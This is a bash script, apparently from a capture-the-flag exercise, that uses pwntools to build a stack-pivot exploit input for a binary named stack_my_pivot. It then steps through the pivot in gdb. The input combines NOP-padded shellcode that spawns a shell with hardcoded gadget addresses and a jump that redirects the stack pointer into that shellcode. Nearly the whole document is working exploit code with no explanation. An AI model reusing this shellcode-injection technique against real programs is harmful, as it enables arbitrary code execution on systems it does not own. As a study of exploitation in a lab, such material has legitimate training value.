#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = b'\x90' * 20 + shellcode
first_input = first_input[:50].ljust(50, b'\x90')

second_input = b'\x90' * 8 + p64(0x400738) + b'\xeb\xae' + b'\x90' * 6 + p32(0x40072e)

with open('/tmp/pivot_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'set disassembly-flavor intel' \
  -ex 'break *0x400799' \
  -ex 'break *0x40072e' \
  -ex 'run < /tmp/pivot_input' \
  -ex 'printf "\n=== Before return (at leave) ===\n"' \
  -ex 'info registers rbp rsp rsi' \
  -ex 'x/10gx $rbp-0x20' \
  -ex 'continue' \
  -ex 'printf "\n=== At pivot gadget ===\n"' \
  -ex 'info registers rbp rsp rsi rip' \
  -ex 'x/10gx $rsp' \
  -ex 'x/10gx $rsi' \
  -ex 'stepi' \
  -ex 'printf "\n=== After xchg rsp,rsi ===\n"' \
  -ex 'info registers rbp rsp rsi rip' \
  -ex 'stepi' \
  -ex 'printf "\n=== After nop ===\n"' \
  -ex 'info registers rbp rsp rsi rip' \
  -ex 'stepi' \
  -ex 'printf "\n=== After pop rbp ===\n"' \
  -ex 'info registers rbp rsp rsi rip' \
  -ex 'x/10gx $rsp' \
  -ex 'stepi' \
  -ex 'printf "\n=== After ret ===\n"' \
  -ex 'info registers rbp rsp rsi rip' \
  ./stack_my_pivot 2>&1 | tail -150
